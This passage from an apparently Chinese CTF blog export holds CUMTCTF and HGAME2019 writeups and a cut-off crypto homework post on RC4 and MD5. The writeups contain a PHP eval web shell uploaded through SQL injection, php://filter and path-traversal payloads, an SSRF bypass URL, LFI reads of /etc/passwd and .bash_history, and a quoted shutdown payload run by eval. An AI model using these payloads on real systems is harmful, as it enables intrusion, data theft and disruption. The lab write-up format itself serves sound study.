values( ‘{$path_parts[‘filename’]}’, 0, ‘{$path_parts[‘extension’]}’)，此时的数据库中filename--&gt;&#39;,extension=&#39;&#39;,filename=&#39;snow.jpg，extension--&gt;jpg 利用update更新是的后缀名为空，old name: &#39;,extension=&#39;&#39;,filename=&#39;snow.jpg;new name: snow.jpg，此时执行的sql命令变成update file set filename=’snow.jpg’,oldname=’’,extension=’’,filename=’snow.jpg.jpg’ where fid={$result[‘fid’]}; ，这样的话数据库中就有文件名为 snow.jpg，后缀名为空的记录，但是实际的文件名却是snow.jpg.jpg 上传真正包含shell的文件&lt;?php @eval($_POST[&#39;snow&#39;]);?&gt; ，命名为snow.jpg，数据库中的记录是文件名为snow，扩展名为jpg， 使用rename重命名 old name: snow.jpg，new name: snow.php，此时修改的是文件名是snow.jpg，后缀名为空，此时修改文件名为snow.php，后缀名为空，拼接后就是成功地更名为snow.php，然后访问snow.php即可getshell。 1flag&#123;f34f8aa6cd362582dd1ae5f975c7b20f&#125; crypto 现代密码签到 利用在线des解密，密钥为空。解密后发现U2FsdGVkX18968C+7acWUzWtYyuQd2MFLMh0HnGGnMlmYlemknPnfg==是base64编码，将所得结果再次解密得到flag 古典密码签到 看到字符串带=，猜测是base系列编码，解密发现是base32编码 ^pho^oav`\\ntZnj`\\ntZZZcccx ，之后就是移位密码了，当偏移量是5的时候解密出有意义的明文 123456s = \"xxxxxxxxxxxxx\"flag = \"\"for i in s: flag += chr(ord(i)+5)print(flag)``` cumtctf{easy_soeasy___hhh}1234567891011121314## easyrsa本题e很小，联想到应该是低指数攻击，本来以为是16进制，但是一直不对，细看了一下发现只有0-9和A，b共12个字符，猜测应该是12进制，尝试了一下果然就是12进制&#96;&#96;&#96;python# coding&#x3D;utf-8import gmpy2e &#x3D; 5# 读入 n, 密文n &#x3D; int(&#39;36004b9A985A624479A4891b16130722A5A7453989bA61737A226368504A5689381236451796A445824b5A516b176b40135935b0b8999046154359b0560537100289b9795129505b461542A4897A56561529A705135AA772507bb3172b03b3425A99224b68b45b801459b29A070bAb9408761b4A70b905308772472934486924bA17013A2A801041A05178b0488AA5&#39;,12)c &#x3D; int(&#39;411A016A671768793b5AAbA4A043001A468b8A9A6122290461266393181b021812b6AAbAA1b57161bAA300321174154862338b0098249626A93116b34752540987309A08520bb6780804b5679144173Ab7301b49322587504A75A7A2445928A07A650bb6076bA3412b1375205336b43A11A1510A22893b937065&#39;,12)m, b &#x3D; gmpy2.iroot(c, e)print hex(m)[2:].decode(&#39;hex&#39;) flag如下：1cumtctf&#123;12_jinzhi_rsa&#125; playfir 题目提示很明显，playfire密码爆破，可以看到秘钥是四位，代码如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657# playfairimport stringimport itertools# 返回该字符的行号和列号def get_row_col(word,pass_table): li = pass_table.index(word) li_r = li // 5 li_c = li % 5 return (li_r,li_c)# 输入两个元素的坐标，得到解密对应的两个元素def get_dou_word(r1,c1,r2,c2): if r1 == r2: c1 = (c1-1) % 5 c2 = (c2-1) % 5 return [(r1,c1),(r2,c2)] elif c1 == c2: r1 = (r1-1) % 5 r2 = (r2-1) % 5 return [(r1,c1),(r2,c2)] else: return [(r1,c2),(r2,c1)]# 解密函数def decrypt(cip,keyword): # global pass_table alpha = list(string.ascii_uppercase) alpha.remove('J') for i in keyword: if i == \"J\": continue alpha.remove(i) pass_table = list(keyword) + alpha plain = \"\" for i in range(len(cip)//2): grp = cip[i*2:i*2+2] r1,c1 = get_row_col(grp[0],pass_table) r2,c2 = get_row_col(grp[1],pass_table) temp = get_dou_word(r1,c1,r2,c2) p1 = temp[0][0]*5 + temp[0][1] p2 = temp[1][0]*5 + temp[1][1] plain += pass_table[p1] + pass_table[p2] return plainfor sss in itertools.permutations(string.ascii_uppercase,4): now_key = \"\".join(sss) cip1 = \"DMBCCVTLMNKQ\" cip2 = \"LRBECXPTCPHU\" t1 = decrypt(cip1,now_key) t2 = decrypt(cip2,now_key) if \"FLAGA\" in t1: print(t1) continue elif \"FLAGB\" in t2: print(t2) continue 可以得到爆破出来符合条件的明文，找出语义正确的即可 flagaplayfirflagbyoudoit 求出md5值即可 1flag&#123;355c1fb44b58ad7c38d88b5ba4f095b0&#125; MISC misc签到 解压之后给出了5个图片文件: 文件夹名是braille，想到了盲文，搜索盲文对照表 根据解压文件夹的提示可以对照出flag是B1ind。 base全家桶了解一下?? 应该就是base编码的转换，尝试一下不同的base编码即可 第一层base64 1GY3DMQZWGE3DON2CGU3TMNJWIM3DGMZQGZCDMNJVIY3TIMZQGMYDKRRWGM3TKNSEG42DMMZXGQ3DMN2E 第二层base32 1666C61677B57656C63306D655F7430305F63756D746374667D 第三层base16 1flag&#123;Welc0me_t00_cumtctf&#125; BXS图标真好看 记事本打开发现是一个二进制文件，file命令查看一下文件类型 BXS.txt: PNG image data, 495 x 422, 8-bit/color RGBA, non-interlaced 修改后缀为png，看到一串文字fgoo kwnl{_u n_gaDy_ 0p}，提示古典加密，猜测是栅栏密码，因为字符串长度是21，所以应该分三栏 1flag&#123;Do_you_kn0w_png&#125; 矿大校歌认真听听吧？ 下载zip压缩包，解压后需要密码，在16进制编辑器文件尾部看到cumtctf2019，解压即可得到一个mp3文件，音频也没有什么异常，应该是mp3隐写了https://ctf-wiki.github.io/ctf-wiki/misc/audio/introduction/#_2，运行尝试一下 1Decode.exe -X -P cumtctf2019 cumt.mp3 1flag&#123;cumtctf_1s_v3ry_g00d!&#125; 起床改error啦！ binwalk查看图片发现存在zip压缩包，提取一下 12binwalk 2333.pngforemost 2333.png 解压压缩包可以得到一个doc文件，在选项中查看隐藏文字即可看到flag RE 逆向签到 直接丢进IDA查看，查看伪代码： 可以看到这些变量占用了4个字节来存储。 这里的v35是100以内的任何数，也就是说可以通过爆破的方式来求得v35的值。 查看check函数，s里面的数字应该和从v5开始，地址每加上4LL的值相等。也就是说在29位的flag里面，每一位的值和v5-v34相等。所以写一个简单的脚本即可爆破出来。 12345678#coding:utf-8v5 = [53,63,50,52,40,1,50,61,55,99,62,118,98,60,60,12,106,58,37,54,12,38,12,102,48,60,33,54,46]for i in range(0,100): res = \"\" for j in range(0,29): res += chr(v5[j]^i) print res 运行结果： Eazy_Math 同样的，还是丢进IDA中查看伪代码： flag有9位，在经过String2Int和Change两个函数的变换后，如果check成功，即可成功。 首先查看String2Int函数： 这个函数的作用就是将s里面的字符内容转换成int型的数值存储在v14-v18中。 查看Check函数后，可以轻易看出check的内容就是将变换后的9位与v2-v10相比较。 最后是Change函数： 第一个双层循环将a3里面的数值置为0，也就是v4里面的值。第二个三重循环可以拆开来看。前两个变量i和j总共循环9次，代表着算出v4里面的数值。最后一个循环变量m则是计算的过程。这里不妨设9个未知数A,B,C,D,E,F,G,H,I。经过推算，3*k+m 是每次取三个连续的数，3*m+1是每次取0，3，6或1，4，7或2，5，8。这里代表着取v5-v13里面的数值。分析之后可以列出三个方程组： \\begin{cases} A+2B+C=274\\\\ 2A+B+C=294\\\\ A+B+2C=316 \\end{cases} \\begin{cases} D+2E+F=262 \\\\ 2D+E+F=274 \\\\ D+E+2F=252 \\\\ \\end{cases} \\begin{cases} G+2H+I=380 \\\\ 2G+H+I=421 \\\\ G+H+2I=427 \\\\ \\end{cases}简单的方程组求得A-G的9个值转化为字符即为flag。","categories":[{"name":"writeup","slug":"writeup","permalink":"http://chaosec.top/categories/writeup/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://chaosec.top/tags/CTF/"}]},{"title":"HGAME2019-Web-Week1&2","slug":"hgame2019","date":"2019-01-30T07:15:00.000Z","updated":"2019-02-12T05:04:28.094Z","comments":true,"path":"2019/01/30/hgame2019/","link":"","permalink":"http://chaosec.top/2019/01/30/hgame2019/","excerpt":"前言 寒假无聊，听说这个题目非常基础（手动滑稽:(），所以来做一做","text":"前言 寒假无聊，听说这个题目非常基础（手动滑稽:(），所以来做一做 week-1 谁吃了我的flag vim文件泄露.index.html.swp，vim恢复即可得到flag1hgame&#123;3eek_diScl0Sure_fRom+wEbsit@&#125; very easy web url二次编码绕过 ?id=%2576%2569%2564%2561%25721hgame&#123;urlDecode_Is_GoOd&#125; 换头大作战 题目要求POST传值 1curl http:&#x2F;&#x2F;120.78.184.111:8080&#x2F;week1&#x2F;how&#x2F;index.php --data &quot;want&#x3D;12&quot; 得到回显 1&lt;br&#x2F;&gt;https:&#x2F;&#x2F;www.wikiwand.com&#x2F;en&#x2F;X-Forwarded-For&lt;br&#x2F;&gt;only localhost can get flag 依次按照要求设置请求头 1curl http:&#x2F;&#x2F;120.78.184.111:8080&#x2F;week1&#x2F;how&#x2F;index.php --data &quot;want&#x3D;12&quot; -H &quot;x-forwarded-for:127.0.0.1&quot; -A &quot;User-Agent:Waterfox&#x2F;50.0&quot; -e www.bilibili.com 1hgame&#123;hTTp_HeaDeR_iS_Ez&#125; can u find me? 查看源代码可知存在f12.php界面，在响应头中可以看到密码 woyaoflag，提交即会出现cilck me to get flag，点击则跳转到 toofast.php，回显aoh,your speed is sososo fast,the flag must have been left in somewhere，应该是出现了302跳转，抓包即可得到flag 1hgame&#123;f12_1s_aMazIng111&#125; week-2 easy_php 探测目录发现robots.txt下存在文件img/index.php，访问之，得到PHP代码 12345678&lt;?php error_reporting(0); $img = $_GET['img']; if(!isset($img)) $img = '1'; $img = str_replace('../', '', $img); include_once($img.\".php\"); highlight_file(__FILE__); 题目过滤了../，且将其转换为空字符串，所以我们可以用..././来绕过，本来试了 ..././flag，可是打不出flag，最终尝试了filter协议，原因在于include语句会将代码当做php代码执行，而转成base64编码之后则由于没有php前缀而无法被当成php代码从而将文本打印出来 payload 1http:&#x2F;&#x2F;118.24.25.25:9999&#x2F;easyphp&#x2F;img&#x2F;index.php?img&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;...&#x2F;.&#x2F;flag base64解码即可得到flag， 1hgame&#123;You_4re_So_g0od&#125; php trick 代码审计 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748//admin.phphighlight_file(__FILE__);$str1 = (string)@$_GET['str1'];$str2 = (string)@$_GET['str2'];$str3 = @$_GET['str3'];$str4 = @$_GET['str4'];$str5 = @$_GET['H_game'];$url = @$_GET['url'];if( $str1 == $str2 )&#123; die('step 1 fail');&#125;if( md5($str1) != md5($str2) )&#123; die('step 2 fail');&#125;if( $str3 == $str4 )&#123; die('step 3 fail');&#125;if ( md5($str3) !== md5($str4))&#123; die('step 4 fail');&#125;if (strpos($_SERVER['QUERY_STRING'], \"H_game\") !==false) &#123; die('step 5 fail');&#125;if(is_numeric($str5))&#123; die('step 6 fail');&#125;if ($str5&lt;9999999999)&#123; die('step 7 fail');&#125;if ((string)$str5&gt;0)&#123; die('step 8 fial');&#125;if (parse_url($url, PHP_URL_HOST) !== \"www.baidu.com\")&#123; die('step 9 fail');&#125;if (parse_url($url,PHP_URL_SCHEME) !== \"http\")&#123; die('step 10 fail');&#125;$ch = curl_init();curl_setopt($ch,CURLOPT_URL,$url);$output = curl_exec($ch);curl_close($ch);if($output === FALSE)&#123; die('step 11 fail');&#125;else&#123; echo $output;&#125; 第一个点md5绕过，第二个点是数组绕过，php数组在比较是比任何数字都大，payload 1http:&#x2F;&#x2F;118.24.3.214:3001?str1&#x3D;240610708&amp;str2&#x3D;QNKCDZO&amp;str3[]&#x3D;a&amp;str4[]&#x3D;b&amp;H%5fgame[]&#x3D;5&amp;url&#x3D;http:&#x2F;&#x2F;@127.0.0.1:80@www.baidu.com&#x2F;admin.php 用两个@的原因可以参考这篇文章ref 当url中有多个@符号时，parse_url中获取的host是最后一个@符号后面的host，而libcurl则是获取的第一个@符号之后的。因此当代码对user@eval.com:80@baidu.com 进行解析时，PHP获取的host是baidu.com是允许访问的域名，而最后调用libcurl进行请求时则是请求的eval.com域名，可以造成ssrf绕过此外对于evil@baidu.com这样的域名进行解析时,php获取的host是evil@baidu.com，但是libcurl获取的host却是evil.com 可以得到admin.php页面的代码 12345678910111213//flag.phpif($_SERVER['REMOTE_ADDR'] != '127.0.0.1') &#123; die('only localhost can see it');&#125;$filename = $_GET['filename']??'';if (file_exists($filename)) &#123; echo \"sorry,you can't see it\";&#125;else&#123; echo file_get_contents($filename);&#125;highlight_file(__FILE__); 查看代码可知存在flag.php页面，关键代码如下：123456if (file_exists($filename)) &#123; echo \"sorry,you can't see it\";&#125;else&#123; echo file_get_contents($filename);&#125; 当filename是flag.php（即文件存在时），又无法读取到文件，此时可以利用file_get_contents支持多种协议来读取到文件，可以使用php://filter协议，最终payload如下 1http:&#x2F;&#x2F;118.24.3.214:3001?str1&#x3D;240610708&amp;str2&#x3D;QNKCDZO&amp;str3[]&#x3D;a&amp;str4[]&#x3D;b&amp;H%5fgame[]&#x3D;5&amp;url&#x3D;http:&#x2F;&#x2F;@127.0.0.1:80@www.baidu.com&#x2F;admin.php?filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php flag.php 1&lt;?php $flag &#x3D; hgame&#123;ThEr4_Ar4_s0m4_Php_Tr1cks&#125; ?&gt; PHP Is The Best Language 1234567891011121314151617181920212223include 'secret.php';#echo $flag;#echo $secret;if (empty($_POST['gate']) || empty($_POST['key'])) &#123; highlight_file(__FILE__); exit;&#125;if (isset($_POST['door']))&#123; $secret = hash_hmac('sha256', $_POST['door'], $secret);&#125;$gate = hash_hmac('sha256', $_POST['key'], $secret);if ($gate !== $_POST['gate']) &#123; echo \"Hacker GetOut!!\"; exit;&#125;if ((md5($_POST['key'])+1) == (md5(md5($_POST['key'])))+1) &#123; echo \"Wow!!!\"; echo \"&lt;/br&gt;\"; echo $flag;&#125;else &#123; echo \"Hacker GetOut!!\";&#125; 代码审计题目，核心代码在于 12345678if (isset($_POST['door']))&#123; $secret = hash_hmac('sha256', $_POST['door'], $secret);&#125;$gate = hash_hmac('sha256', $_POST['key'], $secret);if ($gate !== $_POST['gate']) &#123; echo \"Hacker GetOut!!\"; exit;&#125; 我们无法控制$secret变量，自然无法计算出对应的哈希值，那么有没有那种带加密输入（door）的哈希与secret值无关呢？在PHP里面这个是存在的，就是数组(Array)，由于数组是hash_hmac无法处理的输入类型，所以会返回null 第二处在于(md5($_POST[&#39;key&#39;])+1) == (md5(md5($_POST[&#39;key&#39;])))+1 此处我们可以爆破 123456for($i=1;$i&lt;9999999999;$i++)&#123; if ((md5($i)+1) == (md5(md5($i)))+1) &#123; echo $i; break; &#125;&#125; 结果为12 最终payload为 1door[]&#x3D;12&amp;key&#x3D;12&amp;gate&#x3D;4217722a8aee69d5ed50f3e5ed1cceb1feb79784baaaa6bbf53515ce0eb4daaf flag如下 1hgame&#123;Php_MayBe_Not_Safe&#125; Baby_Spider 题目考察我们的爬虫能力，真的做的我胃疼 题目一共30关，40秒内答对30关的数学题即可获得flag 1-10需要用token先登录一下，注意要带上UA头，如果不带的话到第十关算式就会变成 1(lambda __g: [(os.system(&#39;shutdown -s -t 0&#39;), (os.system(&#39;shutdown now&#39;), None)[1])[1] for __g[&#39;os&#39;] in [(__import__(&#39;os&#39;, __g, __g))]][0])(globals())#-----&#x3D;? 由eval函数执行之后直接就关机了（这反爬虫机制真的是骚~~） 11-20第十一关开始题目就变了，居然修改了css字体，抓取一下css文件如下 123456@font-face &#123; font-family: Ariali; src: url(&#39;&#x2F;static&#x2F;Ariali.otf&#39;); font-weight: normal; font-style: normal;&#125; 下载字体可以看到数字对应规则变化了，对应置换一下即可 21-30此关开始之后，隐藏了真实的数学表达式位置，如果按照题目的计算答案是错的，结果是在css中的after元素下找到了算式，获取之后计算即可 最终paylaod如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import requestsimport retoken = \"KxvEiiWBm41Xe6PTlKS3DnR4vsnfFcXL\"headers = &#123;'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0'&#125;url1 = \"http://111.231.140.29:10000\"url2 = \"http://111.231.140.29:10000/question\"url3 = \"http://111.231.140.29:10000/solution\"url4='http://111.231.140.29:10000/statics/style.css'res = requests.post(url1,data=dict(token=token))cookies = res.cookiesal_list = '1026943587'for i in range(1,11): # res = requests.get(url2,cookies=cookies,headers=headers) print('-------------round',i,'---------------') exp = re.findall(r'&lt;span&gt;(.+)&lt;/span',res.text)[0] print(exp) data = dict(answer=str(eval(exp[:-2]))) res = requests.post(url3,cookies=cookies,data=data,headers=headers) cookies = res.cookies for i in range(11,21): print('-------------round',i,'---------------') exp = re.findall(r'&lt;span&gt;(.+)&lt;/span',res.text)[0] exp = list(exp) for x in range(len(exp)): if ord(exp[x])&gt;47 and ord(exp[x]) &lt; 59: exp[x] = al_list[ord(exp[x])-48] exp = \"\".join(exp) print(exp) data = dict(answer=str(eval(exp[:-2]))) res = requests.post(url3,cookies=cookies,data=data,headers=headers) cookies = res.cookiesfor i in range(21,31): print('-------------round',i,'---------------') res = requests.get(url4,cookies=cookies,headers=headers) exp = re.findall(r'content:\"(.+)\"',res.text)[0] print(exp) data = dict(answer=str(eval(exp[:-2]))) res = requests.post(url3,cookies=cookies,data=data,headers=headers) cookies = res.cookies if 'hgame' in res.text: print(res.text) flag如下： 1hgame&#123;e7b2703a92574012c10a90d0c96051a5b38c8d60a8861c66e7a0898812144083&#125; Math有趣 先是一道数学题，到了第二题之后是一个图片，点击图片链接，发现链接有猫腻img/cXVlc3Rpb24ucG5n.php，base64解码之后是question.png，尝试了一下../../../../../etc/passwd(base64编码)，发现可以成功读取文件接下来就是探测工作目录了，学到一个东西，可以探测.bash_history，该文件记录了最近的bash命令../../../../../root/.bash_history 工作目录为/usr/local/tomcat/webapps/ROOT 接下来我们可以给链接加=诱发报错 1http:&#x2F;&#x2F;test.tan90.me:8080&#x2F;img&#x2F;cXVlc3Rpb24ucG5n&#x3D;.php 最终定位到类目录，读取代码../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/classes/hgame/controller/MathController.class 然后反编译，定位到flag的位置 123456789@RequestMapping(value=&#123;\"/flag\"&#125;, method=&#123;org.springframework.web.bind.annotation.RequestMethod.GET&#125;)public String Flag(ModelMap model)&#123; System.out.println(\"This is the last question.\"); System.out.println(\"123852^x % 612799081 = 6181254136845 % 612799081\"); System.out.println(\"The flag is hgame&#123;x&#125;.x is a decimal number.\"); model.addAttribute(\"flag\", \"Flag is not here.\"); return \"flag\";&#125; 这个数学问题可以用Baby Step Giant Step算法解决，github上有相关的代码 1py bsgs.py 123852 6181254136845 612799081 可以得到最小的答案是15387368 flag如下：hgame{15387368}","categories":[{"name":"writeup","slug":"writeup","permalink":"http://chaosec.top/categories/writeup/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://chaosec.top/tags/CTF/"}]},{"title":"密码学作业记录（二）","slug":"crypto2","date":"2019-01-15T15:26:17.000Z","updated":"2019-01-30T11:44:37.833Z","comments":true,"path":"2019/01/15/crypto2/","link":"","permalink":"http://chaosec.top/2019/01/15/crypto2/","excerpt":"接上篇","text":"接上篇 序列密码 RC4算法 ​RC4算法是一种流加密算法，密钥长度可变。它加解密使用相同的密钥，因此也属于对称加密算法。RC4是有线等效加密（WEP）中采用的加密算法，也曾经是TLS可采用的算法之一。 算法原理： ​RSA算法原理非常简单，256字节的状态向量S= {0，1，…，255}，用比特字节表示为S= {00000000, 00000001, ….，11111111}。用一个可变长度为1~256字节（8~8048位）的密钥来初始化256字节的状态向量S={S[0], S[1], …, S[255]}，任何时候，S都包含0~255的8位无符号数的排列组合。加密和解密时，密码流中的每一个字节k由S产生，通过系统的方式随机从S的256个元素中选取一个。每产生一个字节k，S的元素都要被再次排列。具体步骤如下:​ 步骤一：S向量原状态： 1​S&#x3D;[0,1,2,...,255] 步骤二：创建临时向量T（256位），如果密钥K的长度为256位，则直接将K赋给T，否则一直重复复制K，直到填满256位的向量T 步骤三：接下来我们使用T向量来产生S的初始排列。这个过程从S[0]开始一直处理到S[255]，同时对每个S[i]，根据T[i指定的方案将S[i]与S的另一个元素进行交换： 步骤四：密码流产生。一旦S向量的初始排列完成后，密钥就不再被使用。接下来就是使用S自身来不断输出伪随机密码流的过程了。 步骤五：加密。将步骤四中获得的随机字节k与明文的下一字节做异或运算，产生的字节即为对应的密文字节。 ​解密时，由于加密只是使用密码流对明文做了异或运算，因此解密过程只需要使用相同步骤产生密码流并对密文进行同样的异或运算即可得到加密前的明文。 代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354import sysimport base64s = []t = []# 初始化sfor i in range(256): s.append(i);# 秘钥# 通常取16字节k = [1,45,12,12,3,5,6,7,123,45,78,95,65,23,44,55]# 为暂时向量t赋值for i in range(256): t.append(k[i % len(k)])j = 0for i in range(256): j = (j+s[i]+t[i]) % 256 s[i],s[j] = s[j],s[i]f = open('a.txt','rb')text = f.read()# 产生密钥流q = []i = 0j = 0for r in range(len(text)): i = (i+1) % 256 j = (j+s[i]) % 256 s[i],s[j] = s[j],s[i] t = (s[i] + s[j]) % 256 q.append(s[t])cipher = \"\"for i in range(len(text)): t = (q[i] ^ text[i]) % 128 cipher += chr(t)plain = \"\"for i in range(len(text)): t = (q[i] ^ ord(cipher[i])) % 128 plain += chr(t)if sys.argv[1] == \"d\": print(\"plain: \") print(plain)else: print(\"cipher: \") print(base64.b64encode(cipher.encode('utf-8')).decode('utf-8'))f.close() 实例演示： ​ 代码中加密的是一段英文文本，密文转为base64编码存储 安全性分析 ​ 由于RC4算法加密采用的是xor异或运算，所以一旦子密钥序列出现了重复，密文就有可能被破解。 那么，RC4算法生成的子密钥序列是否会出现重复呢？由于存在部分弱密钥，使得子密钥序列在不到100万字节内就发生了完全的重复，如果是部分重复，则可能在不到10万字节内就能发生重复。所以在使用中应该对密钥进行检查。 ​ 根据目前的分析结果，没有任何的分析对于密钥长度达到128位的RC4有效，目前主要的攻击方法还是穷举攻击，所以到目前为止，RC4还算一个安全的加密算法。 ​ 2015年，比利时研究人员Mathy Vanhoef及Frank Piessens，公布了针对RC4加密算法的新型攻击程式，可在75小时内取得cookie的内容。 实用性分析 ​ RC4算法等序列密码加密过程较之分组密码而言相对简单，实现起来相对容易，在加密效率上对分组密码的优势是不言而喻的。此外，对于需要加密/解密数据流的应用，比如在数据通信信道或浏览器/网络链路上，流密码可能是更好的选择 。 ​ 流密码在安全性强度上不逊分组密码，而加密速率又远优于后者，那是不是说明流密码可以完全取代分组密码呢？很可惜，答案是否定的。 ​ 众所周知，分组密码的设计关键在于加解密算法，是明文和密文在密钥的控制下尽可能复杂，而序列密码的设计关键在于密钥序列产生器，使生成的密钥序列具有不可预测性。而密码序列产生器，也就是伪随机数字节流的产生，依赖种子（密钥）和伪随机函数，而如果种子和伪随机函数不变的情况下，每次产生的伪随机数字节流都是一样的。如果每次都用同样的密钥作为PRF的输入，产生同样的密码流来与两个不同的明文流分别进行异或运算得到两个密文流，那么将这两个密文流进行异或，结果就是两个原始明文的异或值。如果明文是文本字符串或其他已知其性质的字节流，那么密码破解很可能会成功。因此，对于这些已知性质的字节流进行流密码加密，密钥就不能被重复使用了。在这一点上，分组密码的优点就体现出来了。 哈希函数 ​ 哈希函数的单向性，压缩性，抗碰撞性等特点使得它能够解决实际应用中很多棘手的安全问题，诸如数字签名，文件指纹等。 MD5算法 ​ MD5(Message Digest Algorithm 5)，为计算机安全领域广泛使用的一种散列函数，用以提供消息的完整性保护。 ​ MD5是一种信息摘要算法，MD5算法对输入任意长度的消息进行运行，通过特定的hash散列方法将文本信息转换成产生一个128位的消息摘要，压缩+加密+hash算法的结合体，是绝对不可逆的。 算法原理：​ 步骤一：数据填充。对消息进行数据填充，使消息的长度对512取模得448，设消息长度为X，即满 足X mod 512=448。根据此公式得出需要填充的数据长度。填充方法：在消息后面进行填充，填充第一位为1，其余为0。 步骤二：添加消息长度。在第一步结果之后再填充上原消息的长度，可用来进行的存储长度为64位。如果消息长度大于264，则只使用其低64位的值，即（消息长度 对 264取模）。在此步骤进行完毕后，最终消息长度就是512的整数倍。 步骤三：初始化链接变量。MD5使用4个32位的寄存器A、B、C、D，最开始存放4个固定的32位初始链接变量，这些参数用于第一轮迭代。 步骤四：分组处理。将每个分组（512比特）分成16个小组，每个小组32位，这些分组参与每轮16步的函数运算，输出为32位值，经过4轮（共有四个轮函数）共64步之后，得到的4个寄存器的值分别于输入链接变量进行模加，即得到此次分组处理的输入链接变量。第四轮最后一步完成后，再与该分组最初的寄存器的初值相加，然后把A、B、C、D的值作为下一个迭代压缩的链接变量输入，直到最后一个消息分组得到的A、B、C、D寄存器值级联输出作为128比特的消息散列值。 ​ 此处需要特别指出的是，在MD5的代码实现中，要特别注意小端序和大端序的问题，这个问题如果不注意的话会导致MD5计算出错。而MD5的所有数据计算都是基于小端序的。 小端字节序（Little Endian）：低位字节存放在低内存地址，高位字节存放在高内存地址端。 大端字节序（Big Endian）：高位字节存放在低内存地址，低位字节存放在高内存地址端。 ​ 在步骤二中添加消息长度就要按照小端序的方法填充长度，同时轮函数中各个参数也要按照小端序来计算，这点一定要特别注意。 ​ 还有对于需要处理多个分组的情况，要做好A、B、C、D寄存器的及时更新，否则无法得到正确的MD5值。 代码如下：import math# 字符串转为2进制def str2bin(s): text = \"\" for i in s: text += '&#123;:0&gt;8&#125;'.format(bin(ord(i))[2:]) return text# 附加填充，输入为字母明文，输出为二进制def additonal_filling(data): bin_data = str2bin(data) origi_mess_len = len(bin_data) if origi_mess_len &gt; math.pow(2,64): print('Message too long!') return \"0\" else: bit_origi_mess_len = f'&#123;bin(origi_mess_len)[2:]:0&gt;64&#125;' mod_remain = origi_mess_len % 512 # 余数 if mod_remain &lt; 449: padding_len = 448 - mod_remain else: padding_len = 448 - mod_remain + 512 if padding_len == 1: bin_data += '1' elif padding_len &gt; 1: bin_data = bin_data + '1' + '0' * (padding_len-1) left = bit_origi_mess_len[:32] right = bit_origi_mess_len[32:] left = left[24:32] + left[16:24] + left[8:16] + left[:8] right = right[24:32] + right[16:24] + right[8:16] + right[:8] # 32为为一组 bin_data += (right + left) return bin_data# 迭代压缩，输出为分组比特消息数组，每组的长度为512bitdef iter_compress(bdata): group_mess = [[]*16] # 分组消息数组 print(len(bdata)) for i in range(len(bdata)//512): temp = bdata[i*512:i*512+512] for j in range(16): print(temp[j*32:j*32+32]) group_mess[i].append(temp[j*32:j*32+32]) return group_mess# 小端序处理 @input hexdef little_endian(x,n): x = f'&#123;bin(x)[2:]:0&gt;&#123;n&#125;&#125;' ans = \"\" for i in range(n//8,0,-1): ans += x[(i-1)*8:i*8] return int(ans,2)# 由于逻辑非比较特殊，所以另外实现一下,输入为16进制数据def not_operate(data): data = f'&#123;bin(data)[2:]:0&gt;32&#125;' out = \"\" for i in data: if i == \"0\": out += \"1\" else: out += \"0\" return int(out,2)# 四个非线性函数,输入均为32bit的三个数据# @input hexdef F(x, y, z): return (x&amp;y) | (not_operate(x) &amp; z)def G(x,y,z): return (x &amp; z) | (y &amp; not_operate(z))def H(x,y,z): return (x ^ y ^ z)def I(x,y,z): return y ^ (x | not_operate(z))def rotate_move(x,n): x = f'&#123;bin(x)[2:]:0&gt;32&#125;' return int(x[n:] + x[:n],2)# t[i]，返回10进制def get_t(i): return int(math.pow(2,32) * abs(math.sin(i)))# @input digitaldef FF(a,b,c,d,m,s,Ti): # m = int(m,2) m = little_endian(int(m,2),32) t = a + F(b,c,d) + m + Ti t = t % (2**32) a = (rotate_move(t,s) + b) % (2**32) return adef GG(a,b,c,d,m,s,Ti): m = little_endian(int(m,2),32) t = a + G(b,c,d) + m + Ti t = t % (2**32) a = (rotate_move(t,s) + b) % (2**32) return adef HH(a,b,c,d,m,s,Ti): m = little_endian(int(m,2),32) t = a + H(b,c,d) + m + Ti t = t % (2**32) a = (rotate_move(t,s) + b) % (2**32) return a def II(a,b,c,d,m,s,Ti): m = little_endian(int(m,2),32) t = a + I(b,c,d) + m + Ti t = t % (2**32) a = (rotate_move(t,s) + b) % (2**32) return adef step_function(M): global A global B global C global D # 复制前一分组的链接变量 AA = A BB = B CC = C DD = D for i in range(len(M)): # 第一轮循环 A = FF(A,B,C,D,M[i][0],7,get_t(1)) D = FF(D,A,B,C,M[i][1],12,get_t(2)) C = FF(C,D,A,B,M[i][2],17,get_t(3)) B = FF(B,C,D,A,M[i][3],22,get_t(4)) A = FF(A,B,C,D,M[i][4],7,get_t(5)) D = FF(D,A,B,C,M[i][5],12,get_t(6)) C = FF(C,D,A,B,M[i][6],17,get_t(7)) B = FF(B,C,D,A,M[i][7],22,get_t(8)) A = FF(A,B,C,D,M[i][8],7,get_t(9)) D = FF(D,A,B,C,M[i][9],12,get_t(10)) C = FF(C,D,A,B,M[i][10],17,get_t(11)) B = FF(B,C,D,A,M[i][11],22,get_t(12)) A = FF(A,B,C,D,M[i][12],7,get_t(13)) D = FF(D,A,B,C,M[i][13],12,get_t(14)) C = FF(C,D,A,B,M[i][14],17,get_t(15)) B = FF(B,C,D,A,M[i][15],22,get_t(16)) # 第二轮循环 A = GG(A,B,C,D,M[i][1],5,get_t(17)) D = GG(D,A,B,C,M[i][6],9,get_t(18)) C = GG(C,D,A,B,M[i][11],14,get_t(19)) B = GG(B,C,D,A,M[i][0],20,get_t(20)) A = GG(A,B,C,D,M[i][5],5,get_t(21)) D = GG(D,A,B,C,M[i][10],9,get_t(22)) C = GG(C,D,A,B,M[i][15],14,get_t(23)) B = GG(B,C,D,A,M[i][4],20,get_t(24)) A = GG(A,B,C,D,M[i][9],5,get_t(25)) D = GG(D,A,B,C,M[i][14],9,get_t(26)) C = GG(C,D,A,B,M[i][3],14,get_t(27)) B = GG(B,C,D,A,M[i][8],20,get_t(28)) A = GG(A,B,C,D,M[i][13],5,get_t(29)) D = 